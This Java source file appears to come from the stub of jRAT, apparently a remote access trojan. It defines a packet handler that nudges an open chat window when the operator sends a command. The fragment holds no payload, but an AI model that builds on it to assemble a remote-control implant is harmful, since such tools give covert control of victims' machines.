package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Connection;

public class Packet58NudgeChat extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (Connection.frameChat != null) {
			Connection.frameChat.nudge();
		}
	}

}
